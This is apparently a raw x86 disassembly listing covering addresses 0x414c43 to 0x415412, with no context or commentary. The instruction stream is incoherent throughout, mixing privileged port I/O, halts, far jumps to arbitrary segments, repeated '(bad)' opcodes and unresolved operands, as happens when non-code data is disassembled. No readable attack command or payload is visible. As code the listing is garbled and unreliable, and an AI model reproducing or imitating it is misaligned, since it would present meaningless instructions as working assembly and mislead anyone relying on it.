  414c43:	lods   al,BYTE PTR ds:[esi]
  414c44:	ror    DWORD PTR [edx],cl
  414c46:	mov    DWORD PTR [ebp+0x8],eax
  414c49:	xchg   edi,eax
  414c4a:	xchg   esi,eax
  414c4b:	jbe    0x414c4c
  414c4d:	dec    ecx
  414c4e:	mov    bl,0xe
  414c50:	jae    0x414bdf
  414c52:	or     cl,BYTE PTR [ecx-0x48c79100]
  414c58:	sub    edx,DWORD PTR [ebx+0xb]
  414c5b:	push   ds
  414c5c:	sub    al,0xf6
  414c5e:	rcl    ch,0x8e
  414c61:	in     eax,0x1a
  414c63:	inc    edi
  414c64:	aam    0xfb
  414c66:	xor    BYTE PTR [eax],ch
  414c68:	xchg   edx,eax
  414c69:	jne    0x414c9b
  414c6b:	ss hlt 
  414c6d:	push   0x4c539340
  414c72:	sub    al,0xce
  414c74:	in     eax,dx
  414c75:	pop    edi
  414c76:	adc    al,0x71
  414c78:	xor    ch,bh
  414c7a:	call   0x533842
  414c7f:	and    al,0xe2
  414c81:	stos   DWORD PTR es:[edi],eax
  414c82:	mov    dh,0x85
  414c84:	mov    ebx,0x690ebbbd
  414c89:	loop   0x414cbc
  414c8b:	imul   ebx,DWORD PTR [ebp-0x47f3f8e5],0x0
  414c92:	mov    ?,WORD PTR [ecx-0x7a9d1d27]
  414c98:	xor    al,0x3c
  414c9a:	pop    ecx
  414c9b:	mov    cl,0x53
  414c9d:	and    ah,BYTE PTR [ecx+0x5fab0b76]
  414ca3:	sub    eax,0x45431091
  414ca8:	inc    ecx
  414ca9:	pop    ds
  414caa:	lods   al,BYTE PTR ds:[esi]
  414cab:	outs   dx,DWORD PTR gs:[esi]
  414cad:	outs   dx,BYTE PTR ds:[esi]
  414cae:	fisttp DWORD PTR [ecx+ecx*1+0x65]
  414cb2:	aam    0x36
  414cb4:	add    BYTE PTR [ebp+0x20f8f07e],0x45
  414cbb:	fsub   DWORD PTR [edx]
  414cbd:	jo     0x414cf1
  414cbf:	adc    cl,BYTE PTR [ebp-0x58]
  414cc2:	dec    edi
  414cc3:	mov    cl,0x93
  414cc5:	(bad)  
  414cc7:	sbb    ecx,DWORD PTR [esi-0x67429d1]
  414ccd:	mov    edi,0x8f24b422
  414cd2:	ins    DWORD PTR es:[edi],dx
  414cd3:	sub    esi,0x7e48e2e9
  414cd9:	jb     0x414c63
  414cdb:	mov    bl,0xfc
  414cdd:	pop    es
  414cde:	cmp    al,0x76
  414ce0:	cmp    esi,DWORD PTR [eax-0x787de163]
  414ce6:	sbb    DWORD PTR [ebp+0x57590c62],ecx
  414cec:	call   0x90b2:0x87530695
  414cf3:	int3   
  414cf4:	inc    esi
  414cf5:	jo     0x414cb4
  414cf7:	dec    edi
  414cf8:	sbb    eax,0x9e9d8c07
  414cfd:	pop    esp
  414cfe:	or     edi,esp
  414d00:	inc    esp
  414d01:	jae    0x414d1f
  414d03:	add    ebp,DWORD PTR [ebx+0x1b89aa5e]
  414d09:	mov    edi,0xcbd7a171
  414d0e:	push   ebp
  414d0f:	es call 0xe1fb3db1
  414d15:	adc    eax,0x1858e96f
  414d1a:	inc    eax
  414d1b:	mov    ecx,0x16181b7a
  414d20:	xor    DWORD PTR [ebp+0x67],edi
  414d23:	mov    eax,ds:0xe26c4943
  414d28:	or     eax,0x92f186dd
  414d2d:	sub    DWORD PTR [esi+0x29b21281],edx
  414d33:	enter  0xa700,0x9e
  414d37:	pop    eax
  414d38:	push   edx
  414d39:	dec    ecx
  414d3a:	jo     0x414d71
  414d3c:	xor    dh,dl
  414d3e:	sbb    bl,BYTE PTR [eax-0x2554815c]
  414d44:	cdq    
  414d45:	ror    DWORD PTR [esi],1
  414d47:	call   0xd1f1fbde
  414d4c:	inc    ebp
  414d4d:	cmp    ah,dl
  414d4f:	fs ret 
  414d51:	xor    BYTE PTR [ebp+0x6cd73291],bh
  414d57:	popa   
  414d58:	add    al,0x7e
  414d5a:	jp     0x414cf1
  414d5c:	(bad)  
  414d5d:	stc    
  414d5e:	loopne 0x414d9b
  414d60:	jns    0x414d24
  414d62:	add    eax,0x823ef001
  414d67:	cmc    
  414d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d69:	add    BYTE PTR [ebx+0x16],dl
  414d6c:	(bad)  
  414d6d:	push   edx
  414d6e:	mov    al,ds:0x8127d762
  414d73:	push   0x21
  414d75:	ins    DWORD PTR es:[edi],dx
  414d76:	in     al,0x98
  414d78:	ins    DWORD PTR es:[edi],dx
  414d79:	jbe    0x414d19
  414d7b:	xchg   ebp,eax
  414d7c:	(bad)  
  414d7d:	montmul (bad)
  414d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d7f:	lds    esp,FWORD PTR [ecx]
  414d81:	and    ecx,DWORD PTR [edx-0x56]
  414d84:	push   edi
  414d85:	int3   
  414d86:	mov    fs,WORD PTR [ebp+0x11]
  414d89:	sub    BYTE PTR [edx+0x1387f95d],cl
  414d8f:	jl     0x414db8
  414d91:	xlat   BYTE PTR ds:[ebx]
  414d92:	xchg   DWORD PTR [edx],edx
  414d94:	nop
  414d95:	add    bl,BYTE PTR [edi]
  414d97:	sbb    dl,dh
  414d99:	add    DWORD PTR [esi],edi
  414d9b:	push   ebx
  414d9c:	neg    edx
  414d9e:	sub    ecx,DWORD PTR [eax-0xde877f3]
  414da4:	jae    0x414d90
  414da6:	and    BYTE PTR [edi-0xa48bdf7],ch
  414dac:	cmc    
  414dad:	jmp    0xb222:0x7b33ebd9
  414db4:	dec    eax
  414db5:	xor    al,0x48
  414db7:	ret    0xd823
  414dba:	(bad)  
  414dbb:	ja     0x414d4c
  414dbd:	shr    DWORD PTR [ecx+0x6ee7f429],cl
  414dc3:	(bad)  
  414dc4:	gs xchg ecx,eax
  414dc6:	in     eax,dx
  414dc7:	mov    ecx,DWORD PTR ds:0xd4dd77ec
  414dcd:	into   
  414dce:	loop   0x414e2b
  414dd0:	mov    di,0x8546
  414dd4:	mov    bh,0x77
  414dd6:	cmc    
  414dd7:	call   0x649cfebc
  414ddc:	pop    esi
  414ddd:	scas   eax,DWORD PTR es:[edi]
  414dde:	and    ch,BYTE PTR [edi]
  414de0:	ins    BYTE PTR es:[edi],dx
  414de1:	dec    edx
  414de2:	lea    ebp,[ebx-0x27]
  414de5:	ret    
  414de6:	shr    BYTE PTR [esi],0x50
  414de9:	scas   al,BYTE PTR es:[edi]
  414dea:	pushf  
  414deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dec:	sbb    DWORD PTR [ebx+0x24544b43],ecx
  414df2:	and    al,0xba
  414df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414df5:	xchg   esp,eax
  414df6:	std    
  414df7:	add    DWORD PTR [edi+0x22],ebx
  414dfa:	(bad)  
  414dfb:	xor    esp,DWORD PTR [ebx]
  414dfd:	lea    ebx,gs:[ecx-0x70]
  414e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e02:	xor    BYTE PTR [edx+0x36],ah
  414e05:	xor    al,bl
  414e07:	cmp    edi,ebp
  414e09:	mov    edx,0x286fb6b1
  414e0e:	inc    edx
  414e0f:	js     0x414e16
  414e11:	ja     0x414e2d
  414e13:	and    al,0xe6
  414e15:	push   ds
  414e16:	fldenv [ecx+0x21214efa]
  414e1c:	fist   WORD PTR [eax]
  414e1e:	cwde   
  414e1f:	xchg   BYTE PTR ds:0xf6d6a673,dl
  414e25:	push   edi
  414e26:	cmp    edx,ebp
  414e28:	push   edi
  414e29:	or     eax,0x33bfa398
  414e2e:	jmp    0xca9320aa
  414e33:	stos   BYTE PTR es:[edi],al
  414e34:	ret    0xf9cd
  414e37:	xchg   BYTE PTR [ecx+eax*4-0x72],ah
  414e3b:	xor    bh,al
  414e3d:	(bad)  
  414e3e:	retf   
  414e3f:	sbb    BYTE PTR [ecx+esi*1],cl
  414e42:	add    al,0x29
  414e44:	out    0x4e,al
  414e46:	cmp    ch,ch
  414e48:	cmp    DWORD PTR [edi-0x64],0x6f
  414e4c:	sbb    eax,0x4275ad8b
  414e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e52:	mov    ds:0x2224deb6,eax
  414e57:	ror    BYTE PTR [ebp+ebx*2-0x44],0x4a
  414e5c:	ror    DWORD PTR [ebx-0x3341b81f],cl
  414e62:	add    bl,BYTE PTR [ebx+esi*4]
  414e65:	pop    esi
  414e66:	sahf   
  414e67:	scas   al,BYTE PTR es:[edi]
  414e68:	cmp    DWORD PTR [edx+0x5c3aadbc],esi
  414e6e:	fnstsw WORD PTR [edx+eiz*4-0x5a]
  414e72:	je     0x414ed0
  414e74:	pushf  
  414e75:	mov    ds,WORD PTR [ebp+0x7fc69036]
  414e7b:	pusha  
  414e7c:	enter  0x7b80,0x1e
  414e80:	inc    esp
  414e81:	enter  0xe459,0xab
  414e85:	in     eax,0xf3
  414e87:	ret    
  414e88:	in     eax,0x7e
  414e8a:	mov    bl,dl
  414e8c:	mov    dl,0x45
  414e8e:	inc    esp
  414e8f:	fadd   QWORD PTR [ebp-0x70]
  414e92:	inc    esi
  414e93:	pop    ss
  414e94:	(bad)  
  414e95:	iret   
  414e96:	popa   
  414e97:	imul   edx,DWORD PTR [ecx-0x24e0f118],0xd01570f4
  414ea1:	test   BYTE PTR [edx+eiz*2-0x66],dh
  414ea5:	mov    BYTE PTR [ecx-0x2bcf7fab],0x30
  414eac:	sbb    BYTE PTR [edi],0xec
  414eaf:	cwde   
  414eb0:	retf   0x553e
  414eb3:	mov    BYTE PTR [ecx-0x18172d34],al
  414eb9:	xchg   esp,eax
  414eba:	sub    edx,0x693a1fa
  414ec0:	xchg   esi,eax
  414ec1:	jg     0x414e9e
  414ec3:	inc    eax
  414ec4:	out    0x9,eax
  414ec6:	xor    DWORD PTR [eax-0x5ed43951],0x8024be45
  414ed0:	xor    DWORD PTR [ebp+0x74],esp
  414ed3:	mov    BYTE PTR [esi+esi*8-0x4d],bh
  414ed7:	xor    BYTE PTR [esi+0x25],al
  414eda:	xor    al,0x45
  414edc:	and    BYTE PTR ss:[ebp-0x43],al
  414ee0:	push   eax
  414ee1:	add    DWORD PTR [ecx-0x4073bc2a],edx
  414ee7:	aad    0x99
  414ee9:	or     BYTE PTR ds:0xec653d1b,0xe0
  414ef0:	lahf   
  414ef1:	aam    0x87
  414ef3:	and    bl,BYTE PTR [eax+ecx*1]
  414ef6:	lods   al,BYTE PTR ds:[esi]
  414ef7:	dec    ebp
  414ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ef9:	sti    
  414efa:	fwait
  414efb:	imul   edi,edx,0xffffff8f
  414efe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eff:	cmp    DWORD PTR [edi],0x4d5c3cc2
  414f05:	dec    ecx
  414f06:	lods   eax,DWORD PTR ds:[esi]
  414f07:	push   ds
  414f08:	mov    bh,0x83
  414f0a:	scas   eax,DWORD PTR es:[edi]
  414f0b:	sbb    DWORD PTR [eax],ebx
  414f0d:	jnp    0x414eec
  414f0f:	push   ecx
  414f10:	shr    BYTE PTR [ecx+eax*8-0x12],0xfb
  414f15:	push   edi
  414f16:	in     al,dx
  414f17:	cmp    al,0x8e
  414f19:	(bad)  
  414f1b:	aad    0x71
  414f1d:	adc    al,0xf0
  414f1f:	push   es
  414f20:	ja     0x414f0c
  414f22:	push   edi
  414f23:	xacquire xchg BYTE PTR [ecx],al
  414f26:	add    ah,bl
  414f28:	and    eax,0x16961417
  414f2d:	fcom   DWORD PTR [ebx]
  414f2f:	rol    DWORD PTR [eax],cl
  414f31:	dec    edx
  414f32:	pop    esp
  414f33:	xor    al,0xe4
  414f35:	jp     0x414f3c
  414f37:	arpl   WORD PTR [ebp-0x37],bx
  414f3a:	sbb    ah,ah
  414f3c:	leave  
  414f3d:	clc    
  414f3e:	mov    ecx,0xaac9f52b
  414f43:	bound  ebp,QWORD PTR [esi-0x2e]
  414f46:	inc    ebx
  414f47:	mov    bh,0xfa
  414f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f4a:	fidiv  DWORD PTR [eax-0x293ed1d1]
  414f50:	pop    ebx
  414f51:	call   0xf42fb0b9
  414f56:	sub    eax,0xc7e302cf
  414f5b:	dec    ebx
  414f5c:	ror    ebp,cl
  414f5e:	jp     0x414fcd
  414f60:	rcr    BYTE PTR [ebx],1
  414f62:	add    eax,0x8d9ab859
  414f67:	ja     0x414fab
  414f69:	mov    eax,0x6a3ac423
  414f6e:	sbb    BYTE PTR [ebp+0x2a],bh
  414f71:	sbb    BYTE PTR [ebx],0x11
  414f74:	lods   eax,DWORD PTR ds:[esi]
  414f75:	xor    eax,DWORD PTR [ebx]
  414f77:	icebp  
  414f78:	mov    esi,0x8081441f
  414f7d:	push   ebp
  414f7e:	xchg   esi,eax
  414f7f:	clc    
  414f80:	mov    ebp,DWORD PTR [ebx-0x6f34c3f2]
  414f86:	and    DWORD PTR [eax-0x1],edi
  414f89:	dec    edi
  414f8a:	mov    WORD PTR [edx+0x58a6b0d8],?
  414f90:	call   0xbf3e:0x4ebe0e
  414f97:	std    
  414f98:	call   0x17694a7d
  414f9d:	mov    ds:0xc7bb7c90,al
  414fa2:	add    bh,BYTE PTR [edx]
  414fa4:	add    BYTE PTR [ecx-0x74],bl
  414fa7:	dec    esi
  414fa8:	icebp  
  414fa9:	int    0xd3
  414fab:	add    DWORD PTR [eax-0x4a7ab805],ecx
  414fb1:	scas   eax,DWORD PTR es:[edi]
  414fb2:	inc    ecx
  414fb3:	les    edi,FWORD PTR [ecx]
  414fb5:	syscall 
  414fb7:	mov    eax,esi
  414fb9:	add    DWORD PTR [ecx+ecx*1],esp
  414fbc:	int3   
  414fbd:	sbb    eax,0x639ddb88
  414fc2:	pop    ebx
  414fc3:	sahf   
  414fc4:	out    0x96,al
  414fc6:	pop    ebx
  414fc7:	sub    esp,esp
  414fc9:	(bad)  
  414fca:	sub    al,0x4a
  414fcc:	retf   
  414fcd:	nop
  414fce:	xchg   ecx,eax
  414fcf:	xchg   esi,eax
  414fd0:	sahf   
  414fd1:	cmp    eax,0x1dc738eb
  414fd6:	int    0x69
  414fd8:	cwde   
  414fd9:	or     BYTE PTR [esi-0xd],dh
  414fdc:	inc    edx
  414fdd:	mov    edi,0x518f3793
  414fe2:	push   es
  414fe3:	sti    
  414fe4:	xor    edx,DWORD PTR [esi-0x2460a02e]
  414fea:	push   esi
  414feb:	and    ebx,DWORD PTR [edx]
  414fed:	lea    eax,[edx+0x531bb34c]
  414ff3:	and    eax,0x8503ae6a
  414ff8:	or     al,0x26
  414ffa:	aad    0xa5
  414ffc:	xchg   esp,eax
  414ffd:	lods   al,BYTE PTR ds:[esi]
  414ffe:	xchg   BYTE PTR [esi-0x5e144f84],bh
  415004:	add    bl,bh
  415006:	mov    eax,ds:0x97967c99
  41500b:	sbb    BYTE PTR [ebp-0x4ca35440],ah
  415011:	xor    eax,0x94a3a191
  415016:	inc    ebp
  415017:	mov    bl,0x7
  415019:	jns    0x41505a
  41501b:	ret    
  41501c:	sub    bl,BYTE PTR [ebx+eax*8+0x227f9977]
  415023:	iret   
  415024:	xchg   edx,eax
  415025:	mov    al,0x3b
  415027:	sub    eax,0x40986f5e
  41502c:	imul   edi,DWORD PTR [edx+ecx*4+0x5c],0x971d93fd
  415034:	aaa    
  415035:	in     eax,0x3d
  415037:	sbb    al,0x36
  415039:	fs aas 
  41503b:	scas   al,BYTE PTR es:[edi]
  41503c:	pop    ebp
  41503d:	and    BYTE PTR [eax-0x7],0xb4
  415041:	cs call 0x719a:0x61c2445
  415049:	xchg   ecx,eax
  41504a:	add    DWORD PTR [ebp-0x4a37818f],esp
  415050:	pop    ecx
  415051:	out    dx,eax
  415052:	jl     0x4150c2
  415054:	adc    eax,0x3a20db8e
  415059:	fwait
  41505a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41505b:	ret    0xab4b
  41505e:	retf   0x3519
  415061:	clc    
  415062:	inc    ebp
  415063:	ds jecxz 0x4150ba
  415066:	mov    dl,0xc9
  415068:	mov    ax,ds:0xe4139dcd
  41506e:	ds inc edi
  415070:	inc    ebp
  415071:	and    BYTE PTR [edi+0x36],dh
  415074:	adc    DWORD PTR [edi-0x4f85b795],ebx
  41507a:	retf   
  41507b:	test   DWORD PTR [eax],0xa844437d
  415081:	xchg   ecx,eax
  415082:	addr16 mov eax,cs:0x2503
  415087:	popa   
  415088:	dec    esi
  415089:	lds    edi,FWORD PTR [ebp+0x696a81]
  41508f:	or     al,0xb5
  415091:	add    dh,BYTE PTR [ebx+0x1c]
  415094:	xor    DWORD PTR [ebp-0x65797c12],edx
  41509a:	jbe    0x4150ab
  41509c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41509d:	cs mov esi,0xf076a41
  4150a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150a4:	xor    esp,DWORD PTR [esi-0x73]
  4150a7:	and    BYTE PTR [edx],0x83
  4150aa:	enter  0x50e9,0xcc
  4150ae:	ins    DWORD PTR es:[edi],dx
  4150af:	inc    ebp
  4150b0:	cmp    ecx,DWORD PTR [eax+0x3d1e08e8]
  4150b6:	push   ss
  4150b7:	or     eax,0x4fc43c7c
  4150bc:	daa    
  4150bd:	inc    ecx
  4150be:	mov    dl,0x8e
  4150c0:	fild   WORD PTR [eax]
  4150c2:	scas   al,BYTE PTR es:[edi]
  4150c3:	rcl    BYTE PTR [edx],cl
  4150c5:	retf   
  4150c6:	sub    esp,DWORD PTR [edi]
  4150c8:	scas   eax,DWORD PTR es:[edi]
  4150c9:	mul    BYTE PTR ds:0xe491df28
  4150cf:	lock or bh,BYTE PTR [esi-0xf21070a]
  4150d6:	shl    DWORD PTR [ebx+0x2a],1
  4150d9:	sub    BYTE PTR [esi+0x73],bl
  4150dc:	pop    esp
  4150dd:	jge    0x41512d
  4150df:	mov    esi,0xa3f8d208
  4150e4:	loope  0x4150ef
  4150e6:	dec    esp
  4150e7:	xchg   edi,eax
  4150e8:	test   al,0x46
  4150ea:	xchg   BYTE PTR [ebp+0x7b],cl
  4150ed:	push   ds
  4150ee:	mov    bl,0x9c
  4150f0:	xchg   ebx,eax
  4150f1:	cwd    
  4150f3:	xchg   edi,eax
  4150f4:	mov    DWORD PTR [edx+eax*4-0x12dab517],edx
  4150fb:	popa   
  4150fc:	push   0xffffffbe
  4150fe:	loop   0x4150a4
  415100:	sub    eax,0x3feeda79
  415105:	popf   
  415106:	jl     0x415155
  415108:	mov    esp,0x89b02fa1
  41510d:	int    0xdd
  41510f:	push   edx
  415110:	lds    ebx,FWORD PTR [edi-0x5b7ab979]
  415116:	and    ch,BYTE PTR [ebx-0x4f937545]
  41511c:	or     eax,0xdda39b09
  415121:	call   0xc73bd617
  415126:	retf   
  415127:	xlat   BYTE PTR ds:[ebx]
  415128:	mov    ds:0x5f9832a3,al
  41512d:	outs   dx,BYTE PTR ds:[esi]
  41512e:	hlt    
  41512f:	sbb    DWORD PTR [ebx-0x79],esi
  415132:	sbb    al,dh
  415134:	test   DWORD PTR ds:0xdfbe923e,ecx
  41513a:	mov    esi,0x90ea7f24
  41513f:	adc    DWORD PTR [ecx+0x28],ebx
  415142:	push   ebx
  415143:	mov    DWORD PTR [edx],edi
  415145:	xchg   edi,eax
  415146:	xchg   edx,eax
  415147:	sahf   
  415148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415149:	ret    
  41514a:	bound  eax,QWORD PTR [edx-0xcaabb2c]
  415150:	sbb    esp,esp
  415152:	mov    dh,0xfa
  415154:	jbe    0x41515a
  415156:	fimul  WORD PTR [ebx+0x3dd8d674]
  41515c:	in     al,dx
  41515d:	ja     0x415199
  41515f:	cmp    esp,edx
  415161:	xor    al,0xe6
  415163:	cld    
  415164:	jmp    0x415114
  415166:	and    bl,BYTE PTR [esi+0xb]
  415169:	std    
  41516a:	xor    DWORD PTR [ebp-0x7],0xd
  41516e:	repz (bad) 
  415170:	in     eax,0x91
  415172:	jo     0x4151ac
  415174:	sub    cl,BYTE PTR [ebx+0x2a47e4e1]
  41517a:	push   esp
  41517b:	pop    eax
  41517c:	jmp    0xd911:0xc71ec246
  415183:	dec    ecx
  415184:	int    0xe
  415186:	les    ebx,FWORD PTR [edi+eiz*2-0x18]
  41518a:	mov    ecx,0x622b26f9
  41518f:	dec    edi
  415190:	imul   edx,DWORD PTR [esp+eax*2-0x146e4a77],0x56
  415198:	xchg   ebp,eax
  415199:	jnp    0x4151bc
  41519b:	mov    ch,0x2c
  41519d:	xor    BYTE PTR [esi],0x67
  4151a0:	cmp    eax,0x8bc5b647
  4151a5:	mov    edi,0x8783ad20
  4151aa:	push   esi
  4151ab:	aas    
  4151ac:	sub    ecx,DWORD PTR [esi-0x31]
  4151af:	in     al,0x3a
  4151b1:	jmp    DWORD PTR [edx]
  4151b3:	loop   0x4151ec
  4151b5:	or     BYTE PTR ds:0x6e12d287,0x97
  4151bc:	xchg   ecx,eax
  4151bd:	addr16 test al,0xc2
  4151c0:	mov    eax,0xe9e24c80
  4151c5:	shr    BYTE PTR [eax+0x4c35a0a9],1
  4151cb:	inc    esi
  4151cc:	ins    DWORD PTR es:[edi],dx
  4151cd:	(bad)  
  4151ce:	adc    eax,0x8372a098
  4151d3:	test   al,0x7d
  4151d5:	loopne 0x4151c6
  4151d7:	addr16 je 0x4151c4
  4151da:	xor    ebx,0xffffff8f
  4151dd:	jne    0x4151c3
  4151df:	lea    esi,[eax]
  4151e1:	sar    edi,0x11
  4151e4:	jp     0x4151c0
  4151e6:	shl    BYTE PTR [ecx],cl
  4151e8:	add    al,0xfe
  4151ea:	mov    dh,0x51
  4151ec:	fwait
  4151ed:	pushf  
  4151ee:	call   0x3e80:0xa8ff8e
  4151f5:	sbb    bh,bl
  4151f7:	fistp  DWORD PTR [ebp-0x75a388ca]
  4151fd:	ss mov ecx,0xf9683e98
  415203:	xor    BYTE PTR [edi-0x13],al
  415206:	mov    eax,DWORD PTR [edx-0x5708af2f]
  41520c:	data16 mov bh,BYTE PTR [eax-0x30]
  415210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415211:	(bad)
  415214:	mov    ebx,0xba1cecc1
  415219:	stc    
  41521a:	es into 
  41521c:	dec    edi
  41521d:	add    eax,0xbadb88f4
  415222:	fdivp  st(5),st
  415224:	jg     0x4151f0
  415226:	hlt    
  415227:	pop    ebp
  415228:	ficom  DWORD PTR [ebx]
  41522a:	scas   eax,DWORD PTR es:[edi]
  41522b:	inc    ecx
  41522c:	sbb    eax,0xbcb754f
  415231:	jnp    0x415247
  415233:	sub    bl,BYTE PTR [ecx]
  415235:	clc    
  415236:	sub    DWORD PTR [ecx],edi
  415238:	pop    ebp
  415239:	enter  0xd895,0xfb
  41523d:	es sar bl,0x28
  415241:	inc    edi
  415242:	and    DWORD PTR [ebx-0x31],0xc6313aa9
  415249:	jo     0x4152ab
  41524b:	pop    ecx
  41524c:	fidiv  DWORD PTR [esi]
  41524e:	popa   
  41524f:	jbe    0x415215
  415251:	mov    cl,0xec
  415253:	shl    edx,cl
  415255:	cli    
  415256:	add    BYTE PTR ds:0x9675d116,dl
  41525c:	ins    BYTE PTR es:[edi],dx
  41525d:	or     esp,DWORD PTR [eax]
  41525f:	sbb    al,0xcd
  415261:	inc    esp
  415262:	pop    esi
  415263:	inc    ecx
  415264:	inc    ebx
  415265:	addr16 push ss
  415267:	sub    eax,0x9b97dd57
  41526c:	mov    ds:0x3e7921a3,al
  415271:	arpl   WORD PTR [esi-0x6fa004a0],dx
  415277:	push   ecx
  415278:	stos   DWORD PTR es:[edi],eax
  415279:	es repz cli 
  41527c:	push   edi
  41527d:	int    0x8f
  41527f:	jne    0x4152e6
  415281:	ret    0xbd97
  415284:	les    ebp,FWORD PTR [esi+0x2a88bdc5]
  41528a:	es mov ch,0xc3
  41528d:	mov    ds:0x7abcab18,eax
  415292:	test   BYTE PTR [ebp-0x54],cl
  415295:	imul   edi,DWORD PTR [ebx],0xffffff9e
  415298:	imul   ebp,DWORD PTR [ebx+0x49b95624],0xb
  41529f:	pop    es
  4152a0:	xchg   esp,eax
  4152a1:	sahf   
  4152a2:	or     al,0x66
  4152a4:	outs   dx,DWORD PTR ds:[esi]
  4152a5:	mov    ss:0xa7b689d5,eax
  4152ab:	imul   ecx,DWORD PTR [eax],0x30
  4152ae:	xor    eax,0x557c2d8d
  4152b3:	(bad)  
  4152b5:	call   0x9169:0xd8b966a6
  4152bc:	cmp    bh,bh
  4152be:	(bad)  
  4152bf:	pop    esi
  4152c0:	jecxz  0x415331
  4152c2:	jle    0x4152d5
  4152c4:	xor    edx,edi
  4152c6:	mov    esp,0xd5036c4a
  4152cb:	sub    esi,esi
  4152cd:	fldenv [ecx]
  4152cf:	aam    0x1a
  4152d1:	iret   
  4152d2:	repz sub BYTE PTR [ecx+eiz*8-0xc67e192],0x6a
  4152db:	xchg   ebx,eax
  4152dc:	rol    DWORD PTR [ecx+0x2d],cl
  4152df:	jecxz  0x415329
  4152e1:	lods   al,BYTE PTR ds:[esi]
  4152e2:	inc    ebx
  4152e3:	fs jmp 0x3064:0x149b8556
  4152eb:	push   ecx
  4152ec:	jae    0x4152ce
  4152ee:	dec    ecx
  4152ef:	mov    ebp,0x8cd04ddb
  4152f4:	push   ebp
  4152f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152f6:	push   esp
  4152f7:	and    DWORD PTR [ebx-0x4438edb2],ebp
  4152fd:	jnp    0x415299
  4152ff:	sar    ch,cl
  415301:	inc    esi
  415302:	xor    DWORD PTR [ebx+eiz*1],0x786d5955
  415309:	inc    ecx
  41530a:	mov    ds:0xcc1a47eb,al
  41530f:	js     0x41530f
  415311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415312:	das    
  415313:	dec    esi
  415314:	jl     0x4152a6
  415316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415317:	les    esp,FWORD PTR [ebx-0x5fe309de]
  41531d:	je     0x415377
  41531f:	stos   BYTE PTR es:[edi],al
  415320:	mov    dh,0x40
  415322:	shr    dh,0x15
  415325:	jmp    0x415356
  415327:	daa    
  415328:	xchg   edx,eax
  415329:	and    DWORD PTR [ecx-0x27242bab],edi
  41532f:	sub    al,0x23
  415331:	and    DWORD PTR [edi*4+0x5eeafa66],0x62216dc
  41533c:	out    0xc8,eax
  41533e:	xor    al,0x83
  415340:	jbe    0x415357
  415342:	or     dl,BYTE PTR [eax+ebx*2-0x580bc530]
  415349:	aas    
  41534a:	adc    eax,0x709bd97f
  41534f:	fwait
  415350:	cmp    eax,0xd7536c61
  415355:	xchg   ecx,eax
  415356:	mov    eax,0x1d92d126
  41535b:	test   BYTE PTR [ecx-0x45],0xb3
  41535f:	test   eax,0x42bb5f02
  415364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415365:	mov    ebx,0x81fcbd7e
  41536b:	(bad)  
  41536c:	ret    
  41536d:	scas   eax,DWORD PTR es:[edi]
  41536e:	mov    edi,0x8e23e0d5
  415373:	rcr    BYTE PTR [ebp+0x2a],1
  415376:	sbb    al,0x81
  415378:	fldenv [ebx]
  41537a:	adc    DWORD PTR [ebx+0x31],esp
  41537d:	mov    ebx,DWORD PTR [esi-0x30e3253d]
  415383:	mov    eax,0xca89c3e7
  415388:	and    cl,BYTE PTR [edi]
  41538a:	adc    esi,DWORD PTR [ecx+eiz*8]
  41538d:	xor    ebp,DWORD PTR ds:0x5975229c
  415393:	jnp    0x415400
  415395:	adc    DWORD PTR [esi],ebp
  415397:	xor    dl,BYTE PTR [eax+0x4a]
  41539a:	jg     0x41539a
  41539c:	inc    esi
  41539d:	ja     0x4153a7
  41539f:	jp     0x415384
  4153a1:	pop    esp
  4153a2:	mov    ds:0x76e7d628,eax
  4153a7:	sub    DWORD PTR [eax+ebx*8-0x52],esi
  4153ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ac:	mov    dh,0x44
  4153ae:	sub    al,0xa9
  4153b0:	adc    eax,0xb48c8811
  4153b5:	jo     0x415340
  4153b7:	or     esp,DWORD PTR [ecx]
  4153b9:	into   
  4153ba:	icebp  
  4153bb:	mov    dl,0xec
  4153bd:	cdq    
  4153be:	loopne 0x4153dd
  4153c0:	jecxz  0x4153b0
  4153c2:	out    dx,al
  4153c3:	sahf   
  4153c4:	jl     0x415407
  4153c6:	pop    edx
  4153c7:	rcr    DWORD PTR [ecx+0x0],cl
  4153ca:	push   edx
  4153cb:	cdq    
  4153cc:	xor    eax,0x1455562c
  4153d1:	push   edi
  4153d2:	mov    ah,0x52
  4153d4:	fwait
  4153d5:	aad    0x7c
  4153d7:	loop   0x415374
  4153d9:	pop    ebx
  4153da:	sub    cl,BYTE PTR [eax]
  4153dc:	fsubp  st(4),st
  4153de:	push   eax
  4153df:	mov    al,0x42
  4153e1:	push   eax
  4153e2:	lea    edx,[ecx]
  4153e4:	mov    ebx,0x351d3ee
  4153e9:	pop    esp
  4153ea:	dec    edx
  4153eb:	out    dx,eax
  4153ec:	mov    DWORD PTR [esi-0x4b4e372f],eax
  4153f2:	arpl   WORD PTR [eax],cx
  4153f4:	mov    WORD PTR [edi+0x4c27c4a2],?
  4153fa:	inc    edi
  4153fb:	and    eax,0x67780ec8
  415400:	fisub  WORD PTR [eax+0x39]
  415403:	pop    DWORD PTR [ebx]
  415405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415406:	adc    BYTE PTR [ebx],cl
  415408:	cmc    
  415409:	adc    al,bh
  41540b:	jbe    0x415405
  41540d:	call   0xd9a3378f
  415412:	mov    ds:0x51e6c61c,al
